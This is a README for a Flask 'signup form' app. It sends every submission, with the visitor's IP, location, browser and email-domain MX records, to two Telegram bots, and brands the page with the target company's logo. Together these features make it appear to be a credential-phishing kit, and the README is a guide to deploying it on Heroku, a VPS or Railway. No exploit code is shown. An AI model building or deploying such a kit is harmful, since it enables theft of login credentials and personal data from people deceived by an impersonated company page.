# NewSeason Flask Signup App

A Flask-based signup form application with enhanced user tracking and dual Telegram bot integration.

## Features

- ✅ **Responsive Signup Form** with Bootstrap 5 styling
- 🔒 **Cloudflare Turnstile** captcha integration
- 🏢 **Clearbit Logo API** for company branding
- 📱 **Dual Telegram Bot** notifications
- 🌍 **Enhanced User Tracking**:
  - Real IP detection (proxy-aware)
  - Geolocation (city/country)
  - Browser detection
  - MX record lookup
  - Timestamp logging

## Quick Start

### Local Development

1. **Clone and Setup**:
   ```bash
   git clone <repository-url>
   cd newseason
   python -m venv venv
   venv\Scripts\activate  # Windows
   pip install -r requirements.txt
   ```

2. **Configure Telegram Bots**:
   - Edit `app.py` lines 8-9 for main bot credentials
   - Uncomment lines 25-26 (or others) for secondary bot

3. **Run**:
   ```bash
   python app.py
   ```
   Access at: http://localhost:5000

### Production Deployment

#### Option 1: Heroku
```bash
# Install Heroku CLI, then:
heroku create your-app-name
git push heroku main
```

#### Option 2: VPS/Cloud
```bash
# Install gunicorn for production
pip install gunicorn
gunicorn app:app --bind 0.0.0.0:5000
```

#### Option 3: Railway/Render
- Connect your GitHub repository
- Set build command: `pip install -r requirements.txt`
- Set start command: `python app.py`

## Configuration

### Telegram Bots
Edit the following in `app.py`:

```python
# Main Bot (always active)
TELEGRAM_BOT_TOKEN = 'your-main-bot-token'
TELEGRAM_CHAT_ID = 'your-main-chat-id'

# Secondary Bot (uncomment to activate)
SECONDARY_TELEGRAM_BOT_TOKEN = 'your-secondary-bot-token'
SECONDARY_TELEGRAM_CHAT_ID = 'your-secondary-chat-id'
```

### Cloudflare Turnstile
Update the secret key in `app.py` line 156:
```python
secret_key = 'your-turnstile-secret-key'
```

## File Structure

```
newseason/
├── app.py              # Main Flask application
├── requirements.txt    # Python dependencies
├── templates/
│   └── he-opas.html   # Signup form template
├── .gitignore         # Git ignore file
└── README.md          # This file
```

## Environment Variables (Optional)

For enhanced security, consider using environment variables:

```bash
export TELEGRAM_BOT_TOKEN="your-token"
export TELEGRAM_CHAT_ID="your-chat-id"
export TURNSTILE_SECRET="your-secret"
```

## Dependencies

- Flask >= 2.0
- requests >= 2.0
- dnspython >= 2.0

## License

Private Project - All Rights Reserved
